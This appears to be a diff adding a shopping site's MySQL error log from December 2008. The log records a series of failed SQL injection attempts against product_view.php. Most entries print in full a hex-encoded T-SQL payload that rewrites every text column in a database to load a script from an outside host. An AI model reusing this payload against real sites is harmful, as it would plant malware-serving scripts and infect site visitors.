+and A.shop_idx = 
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C41524520405420564152434841522832' at line 5
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11;dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--
+update tblProduct set p_view = p_view + 1 where p_idx = 11;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);--
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C41524520405420564152434841522832' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11';dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--
+
+select count(*) from tblRankProduct where 1
+and p_idx = 11\';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);-- and rp_rank > 0 and rp_rank <= 10
+and date_sub(rp_end_dt, INTERVAL 6 DAY) = rp_start_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228' at line 2
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11';dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--
+
+select A.*, B.p_e_idx, B.end_dt, C.shop_name, C.shop_medal, C.shop_url,
+ifnull((select rp_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_rank,
+ifnull((select rp_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_last_rank,
+ifnull((select rp_total_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_rank,
+ifnull((select rp_total_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_last_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rpc_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as best_codi_cnt,
+ifnull((select sum(p_u_val) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val > 0),0) as up_cnt,
+ifnull((select abs(sum(p_u_val)) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val < 0),0) as down_cnt,
+ifnull((select count(*) from tblProductComment where p_idx=A.p_idx and p_c_reg_dt between B.start_dt and B.end_dt ),0) as comment_cnt
+from tblProduct A, tblProductEach B, tblShop C
+where 1
+and A.p_idx = B.p_idx and A.shop_idx = C.shop_idx
+and A.p_idx = 11\';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);--
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228' at line 14
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11';dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--
+select A.*, B.shop_name, B.shop_medal, B.shop_url from tblProduct A, tblShop B where A.shop_idx = B.shop_idx and A.p_idx = 11\';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);--
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11';dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--
+
+select A.p_idx, B.p_e_idx, A.p_main_img
+from tblProduct A, tblProductEach B
+where 1 
+and A.p_idx = B.p_idx
+and A.p_idx != 11\';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);--
+and A.shop_idx = 
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228' at line 5
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11';dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--
+update tblProduct set p_view = p_view + 1 where p_idx = 11\';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);--
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11%25'%20;dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--%20aNd%20'%25'='
+
+select count(*) from tblRankProduct where 1
+and p_idx = 11%\' ;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);-- aNd \'%\'=\' and rp_rank > 0 and rp_rank <= 10
+and date_sub(rp_end_dt, INTERVAL 6 DAY) = rp_start_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' ;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C41524520405420564152434841522' at line 2
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11%25'%20;dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--%20aNd%20'%25'='
+
+select A.*, B.p_e_idx, B.end_dt, C.shop_name, C.shop_medal, C.shop_url,
+ifnull((select rp_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_rank,
+ifnull((select rp_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_last_rank,
+ifnull((select rp_total_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_rank,
+ifnull((select rp_total_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_last_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rpc_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as best_codi_cnt,
+ifnull((select sum(p_u_val) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val > 0),0) as up_cnt,
+ifnull((select abs(sum(p_u_val)) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val < 0),0) as down_cnt,
+ifnull((select count(*) from tblProductComment where p_idx=A.p_idx and p_c_reg_dt between B.start_dt and B.end_dt ),0) as comment_cnt
+from tblProduct A, tblProductEach B, tblShop C
+where 1
+and A.p_idx = B.p_idx and A.shop_idx = C.shop_idx
+and A.p_idx = 11%\' ;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);-- aNd \'%\'=\'
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' ;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C41524520405420564152434841522' at line 14
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11%25'%20;dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--%20aNd%20'%25'='
+select A.*, B.shop_name, B.shop_medal, B.shop_url from tblProduct A, tblShop B where A.shop_idx = B.shop_idx and A.p_idx = 11%\' ;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);-- aNd \'%\'=\'
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' ;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C41524520405420564152434841522' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11%25'%20;dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--%20aNd%20'%25'='
+
+select A.p_idx, B.p_e_idx, A.p_main_img
+from tblProduct A, tblProductEach B
+where 1 
+and A.p_idx = B.p_idx
+and A.p_idx != 11%\' ;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);-- aNd \'%\'=\'
+and A.shop_idx = 
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' ;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C41524520405420564152434841522' at line 5
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
